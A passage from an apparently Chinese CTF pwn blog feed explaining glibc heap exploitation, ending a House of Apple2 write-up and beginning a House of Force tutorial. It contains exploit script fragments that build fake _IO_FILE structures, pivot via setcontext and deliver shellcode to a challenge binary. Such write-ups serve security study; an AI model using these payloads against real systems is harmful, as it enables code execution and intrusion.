rsp</span></span><br><span class="line"><span class="string">mov r10, 0x100</span></span><br><span class="line"><span class="string">push SYS_sendfile</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end </span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;74r0t#C@rd&quot;</span></span><br><span class="line">out()</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># p.sendline(b&quot;2&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h5 id="io_wfile_underflow_mmap链">2._IO_wfile_underflow_mmap链</h5>
<p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">		      fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">		      &amp;read_stop,</span><br><span class="line">		      fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">		      fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">		      &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_read_ptr = (<span class="type">char</span> *) read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we managed to generate some text return the next character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is some garbage at the end of the file.  */</span></span><br><span class="line">  __set_errno (EILSEQ);</span><br><span class="line">  fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">return</span> WEOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mmap_remap_check (fp)))</span><br><span class="line">    <span class="comment">/* We punted to the regular file functions.  */</span></span><br><span class="line">    <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需满足的条件如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags &amp; _IO_NO_READS == <span class="number">0</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end == <span class="literal">false</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_save_base == <span class="literal">NULL</span>;	<span class="comment">//也可以不为null，但要执行一次free和flag的设置，最好设置为0</span></span><br></pre></td></tr></table></figure></div>
<p>实质上就是进入的点不同，最后利用的链还是相同的。这里如果只是单纯的把虚表从<code>_IO_wfile_jumps</code>改成<code>_IO_wfile_jumps_mmap</code>，实际最后还是会进入overflow那个函数。因为这两个虚表其实是完全相同的，而我们触发的是原来表中overflow那个虚表函数。我们需要添加偏移来进入不同的函数，在本题中，经测试+0x10的偏移能够进入<code>_IO_wdefault_uflow</code>，偏移+0x30能进入<code>_IO_wfile_seekoff</code>，+8偏移能成功进入<code>_IO_wfile_underflow_mmap</code>，其实就是对应原表的偏移。</p>
<p>构造如下</p>
<ul>
<li><code>_flags</code> = <code>~4</code></li>
<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code>
地址（加减偏移）</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
<li><code>_wide_data</code> 设置为可控堆地址
<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> =
<code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_save_base</code> =
<code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> =
可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> =
地址<code>C</code>，用于劫持
<code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
</ul>
<p>但这里rdx进去不是可控地址，看上去是把我们处在第二个字段<code>_IO_read_ptr</code>的largebin
chunk
size给赋值过来了。这就为setcontext赋值增加了难度，所以这一题不用这个方法。我们能成功的到这一步其实已经算是成功的利用了这条链条。可以尝试call到别的地方打。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110011234406.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE  = p64(<span class="number">0x1000</span>)   #read_end</span><br><span class="line">fake_IO_FILE += p64(<span class="number">3</span>)          #read_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">20</span>) + p64(<span class="number">22</span>) #_write_base,_write_ptr</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) #_IO_buf_base,_IO_buf_end </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_save_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_backup_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_save_end</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       #_lock</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    #_wide_data</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            # _mode = <span class="number">0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="meta">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="meta">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps_mmap+<span class="number">0x8</span>)  <span class="meta"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span><span class="number">-0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="io_wdefault_xsgetn链">3. _IO_wdefault_xsgetn链</h5>
<p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    count = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">	      <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	      <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		*s++ = *p++;</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_wget_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>目的是进到<code>__wunderflow (fp)</code>中<code>_IO_switch_to_wget_mode</code>里的<code>(wint_t)_IO_WOVERFLOW (fp, WEOF)</code>这个虚表函数调用。</p>
<p>需要满足条件如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr;	<span class="comment">//可以绕过前面一些麻烦的操作，直奔__wunderflow</span></span><br><span class="line">(fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>)) == <span class="literal">false</span>;	<span class="comment">//mode设置为1即可</span></span><br><span class="line">_IO_in_put_mode (fp)!=<span class="number">0</span>;	<span class="comment">//即fp-&gt;flags &amp; 0x800 != 0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base;</span><br></pre></td></tr></table></figure></div>
<p>构造如下</p>
<ul>
<li><code>_flags</code> = <code>0x800</code></li>
<li><code>vtable</code> =
<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>
地址（加减偏移）</li>
<li><code>_mode</code> &gt;
<code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
<li><code>_wide_data</code> =
可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>
（即满足 <code>*(A+8)=*A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> =
可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> =
地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
</ul>
<p>很可惜的是futureheap这道题只能申请0x700大小以下的堆块，而用largebin
attack改的_IO_list_all后，第一个<code>_IO_FILE</code>结构体的<code>_flags</code>字段实质上就被赋值为largebin
chunk的大小。我们就无法使<code>_IO_in_put_mode (fp)!=0</code>这个条件成立，所以本题也不好使用这一条链条。</p>
<h5 id="总结">总结</h5>
<p>在示例题目中，上面3种方法只有第一种方式比较方便题解，这说明了几个链条的适用条件都有所不同，可以根据具体情况选择不同的链条进行尝试。本质还是<code>_IO_flush_all_lockp</code>这个FSOP的利用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_force</title>
    <url>/blog/2024/10/03/house-of-force/</url>
    <content><![CDATA[<h4 id="适用版本">适用版本</h4>
<p>glibc2.23 - 2.29</p>
<h4 id="利用条件">利用条件</h4>
<ul>
<li>能控制top chunk的size域</li>
<li>能获取heap_base，进而计算出top_chunk的地址</li>
<li>能自由控制堆分配尺寸大小</li>
</ul>
<h4 id="利用思路">利用思路</h4>
<ul>
<li><p>将top
chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p></li>
<li><p>精准计算top chunk的地址与target
addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top
chunk的data域直接位于target addr处。</p></li>
<li><p>再申请一个chunk，往目标地址处写入值。</p></li>
</ul>
<h4 id="实现目的">实现目的</h4>
<p>任意地址写</p>
<h4 id="利用原理">利用原理</h4>
<p>2.27glibc top chunk分配源代码如下</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = <span class="built_in">chunksize</span> (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;			<span class="comment">//分配后剩下的大小</span></span><br><span class="line">  remainder = <span class="built_in">chunk_at_offset</span> (victim, nb);		<span class="comment">//剩下的chunk</span></span><br><span class="line">  av-&gt;top = remainder;							<span class="comment">//更新top chunk</span></span><br><span class="line">  <span class="built_in">set_head</span> (victim, nb | PREV_INUSE |			<span class="comment">//设置从原topchunk分配出的chunk的头部</span></span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  <span class="built_in">set_head</span> (remainder, remainder_size | PREV_INUSE);	<span class="comment">//设置新的top chunk的头部</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">  <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code>
实质上是用来存储经过调整后的内存请求大小的变量。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=						      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same, except also perform an argument and result check.  First, we check</span></span><br><span class="line"><span class="comment">   that the padding done by request2size didn&#x27;t result in an integer</span></span><br><span class="line"><span class="comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span></span><br><span class="line"><span class="comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span></span><br><span class="line"><span class="comment">   overflow.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;				    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);	    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))		    \			<span class="comment">//调整后的sz一定要比传入的bytes要大</span></span></span><br><span class="line">      || <span class="built_in">REQUEST_OUT_OF_RANGE</span> (sz)) \		<span class="comment">//一般都会满足，申请的大小不要太大就行</span></span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned
int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top
chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用
<code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top
chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002907725.png"
                      class=""
                >
<p>由于我们要精准控制申请后的大小来使top
chunk落在想要的位置，也就是要控制request2size(req)的值</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	<span class="comment">//32位系统上通常为0x7,64位上为0xf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof(size_t))		<span class="comment">//32位系统上通常为4,64位上为8</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	<span class="comment">//0x20</span></span></span><br><span class="line"></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             